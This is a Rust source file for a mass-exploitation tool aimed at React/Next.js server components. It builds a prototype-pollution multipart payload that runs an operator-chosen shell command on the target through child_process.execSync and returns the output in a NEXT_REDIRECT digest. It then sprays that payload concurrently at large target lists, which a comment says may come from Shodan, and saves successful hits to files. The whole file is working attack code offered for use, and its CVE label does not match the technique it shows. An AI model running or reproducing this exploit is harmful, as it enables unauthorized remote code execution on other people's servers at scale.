/*
 * React/Next.js RSC Exploit (CVE-2025-29927 style)
 * Converted from react.py to Rust
 * Reads target list from a txt file (IP/URL per line, e.g. from Shodan)
 */

use colored::*;
use reqwest::header::HeaderMap;
use reqwest::multipart;
use serde_json::json;
use std::io::{self, BufRead, BufReader, Write};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::Semaphore;
use tokio::time::Duration;

use crate::common::{build_client_pool, pick_client, save_content};

// ─── Constants ───────────────────────────────────────────────────────────────

const DEFAULT_COMMAND: &str = "id";
const DEFAULT_THREADS: usize = 10;
const BATCH_SIZE: usize = 10_000;

// ─── Build the crafted multipart payload ─────────────────────────────────────

fn build_crafted_chunk(executable: &str) -> String {
    let chunk = json!({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\": \"$B0\"}",
        "_response": {
            "_prefix": format!(
                "var res = process.mainModule.require('child_process').execSync('{}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
                executable
            ),
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    });
    chunk.to_string()
}

// ─── Send exploit to a single target ─────────────────────────────────────────

async fn exploit_target(
    client: &reqwest::Client,
    base_url: &str,
    executable: &str,
) -> Result<(u16, String), String> {
    let crafted_chunk = build_crafted_chunk(executable);

    let form = multipart::Form::new()
        .text("0", crafted_chunk)
        .text("1", "\"$@0\"".to_string());

    let mut headers = HeaderMap::new();
    headers.insert("Next-Action", "x".parse().unwrap());

    let res = client
        .post(base_url)
        .headers(headers)
        .multipart(form)
        .timeout(Duration::from_secs(10))
        .send()
        .await
        .map_err(|e| format!("{}", e))?;

    let status = res.status().as_u16();
    let body = res.text().await.unwrap_or_default();

    Ok((status, body))
}

// ─── Process a single URL ────────────────────────────────────────────────────

async fn process_url(
    client: reqwest::Client,
    raw_url: String,
    executable: String,
    processed: Arc<AtomicU64>,
    total: u64,
) {
    let url = if !raw_url.starts_with("http://") && !raw_url.starts_with("https://") {
        format!("http://{}", raw_url)
    } else {
        raw_url.clone()
    };

    let current = processed.fetch_add(1, Ordering::Relaxed) + 1;

    match exploit_target(&client, &url, &executable).await {
        Ok((status, body)) => {
            // Check if we got command output in the response (via NEXT_REDIRECT digest)
            if body.contains("NEXT_REDIRECT") || (status == 303 || status == 200) {
                println!(
                    "[{}/{}] [{}] {} => {} | {}",
                    current,
                    total,
                    "#".green(),
                    url,
                    format!("Status: {}", status).green(),
                    "POSSIBLE HIT".green().bold()
                );
                // Save successful hit
                save_content("good_react.txt", &format!("{} | status={} | body_len={}", url, status, body.len())).await;

                // If the body has interesting content, save full response
                if body.len() > 10 {
                    save_content(
                        "good_react_full.txt",
                        &format!("=== {} ===\nStatus: {}\n{}\n", url, status, body),
                    )
                    .await;
                }
            } else {
                println!(
                    "[{}/{}] [{}] {} => {}",
                    current,
                    total,
                    "-".red(),
                    url,
                    format!("Status: {}", status).red()
                );
            }
        }
        Err(e) => {
            let msg = if e.contains("timed out") || e.contains("Timeout") {
                "Timeout".to_string()
            } else if e.contains("connection") {
                "Connection Error".to_string()
            } else {
                e
            };
            println!(
                "[{}/{}] [{}] {} => {}",
                current,
                total,
                "-".red(),
                url,
                msg.red()
            );
        }
    }
}

// ─── Process a batch of URLs ─────────────────────────────────────────────────

async fn process_batch(
    batch: Vec<String>,
    thread_count: usize,
    executable: &str,
    processed: &Arc<AtomicU64>,
    total: u64,
    client_pool: &[reqwest::Client],
) {
    let semaphore = Arc::new(Semaphore::new(thread_count));
    let executable = Arc::new(executable.to_string());

    let mut handles = Vec::with_capacity(batch.len());

    for (i, url) in batch.into_iter().enumerate() {
        let permit = semaphore.clone().acquire_owned().await.unwrap();
        let client = pick_client(client_pool, i);
        let exec = executable.clone();
        let proc_clone = processed.clone();

        let handle = tokio::spawn(async move {
            process_url(client, url, (*exec).clone(), proc_clone, total).await;
            drop(permit);
        });
        handles.push(handle);
    }

    for h in handles {
        let _ = h.await;
    }
}

// ─── Count lines in file ────────────────────────────────────────────────────

fn count_lines(path: &str) -> u64 {
    let file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return 0,
    };
    BufReader::new(file).lines().count() as u64
}

// ─── Public Entry Point ──────────────────────────────────────────────────────

pub async fn run() {
    println!(
        "{} | {}",
        "REACT/NEXT.JS".yellow(),
        "RSC EXPLOIT".yellow()
    );
    println!();

    let stdin = io::stdin();

    print!("- Target List (txt) : ");
    io::stdout().flush().unwrap();
    let mut list_path = String::new();
    stdin.lock().read_line(&mut list_path).unwrap();
    let list_path = list_path.trim().to_string();

    print!("- Command [default: {}] : ", DEFAULT_COMMAND);
    io::stdout().flush().unwrap();
    let mut cmd_input = String::new();
    stdin.lock().read_line(&mut cmd_input).unwrap();
    let executable = if cmd_input.trim().is_empty() {
        DEFAULT_COMMAND.to_string()
    } else {
        cmd_input.trim().to_string()
    };

    print!("- Thread [default: {}] : ", DEFAULT_THREADS);
    io::stdout().flush().unwrap();
    let mut thread_input = String::new();
    stdin.lock().read_line(&mut thread_input).unwrap();
    let thread_count: usize = thread_input.trim().parse().unwrap_or(DEFAULT_THREADS);

    print!("- Batch size [default: {}] : ", BATCH_SIZE);
    io::stdout().flush().unwrap();
    let mut batch_input = String::new();
    stdin.lock().read_line(&mut batch_input).unwrap();
    let batch_size: usize = batch_input.trim().parse().unwrap_or(BATCH_SIZE);

    // Build client pool
    let pool_size = thread_count.min(200);
    let client_pool = build_client_pool(pool_size);

    // Count total lines
    eprint!("{}", "[*] Counting targets... ".cyan());
    let total_lines = count_lines(&list_path);
    eprintln!("{}", format!("{} targets found", total_lines).green());

    if total_lines == 0 {
        eprintln!("{}", "No targets found in file.".red());
        return;
    }

    // Open file for streaming
    let file = match std::fs::File::open(&list_path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("{}", format!("Failed to read target file: {}", e).red());
            return;
        }
    };

    let reader = BufReader::with_capacity(8 * 1024 * 1024, file);

    eprintln!(
        "{}",
        format!(
            "[*] Streaming mode: batch_size={}, threads={}, command='{}'",
            batch_size, thread_count, executable
        )
        .green()
    );

    let processed = Arc::new(AtomicU64::new(0));
    let mut batch: Vec<String> = Vec::with_capacity(batch_size);
    let mut batch_num: u64 = 0;

    for line in reader.lines() {
        let line = match line {
            Ok(l) => l,
            Err(_) => continue,
        };

        let trimmed = line.trim().to_string();
        if trimmed.is_empty() {
            continue;
        }

        batch.push(trimmed);

        if batch.len() >= batch_size {
            batch_num += 1;
            eprintln!(
                "{}",
                format!(
                    "[*] Processing batch #{} ({} targets)...",
                    batch_num,
                    batch.len()
                )
                .cyan()
            );

            process_batch(
                std::mem::take(&mut batch),
                thread_count,
                &executable,
                &processed,
                total_lines,
                &client_pool,
            )
            .await;

            batch = Vec::with_capacity(batch_size);
        }
    }

    // Process remaining
    if !batch.is_empty() {
        batch_num += 1;
        eprintln!(
            "{}",
            format!(
                "[*] Processing batch #{} ({} targets)...",
                batch_num,
                batch.len()
            )
            .cyan()
        );

        process_batch(
            batch,
            thread_count,
            &executable,
            &processed,
            total_lines,
            &client_pool,
        )
        .await;
    }

    eprintln!(
        "\n{}",
        format!(
            "[*] Done. Results saved to good_react.txt / good_react_full.txt"
        )
        .green()
    );
}
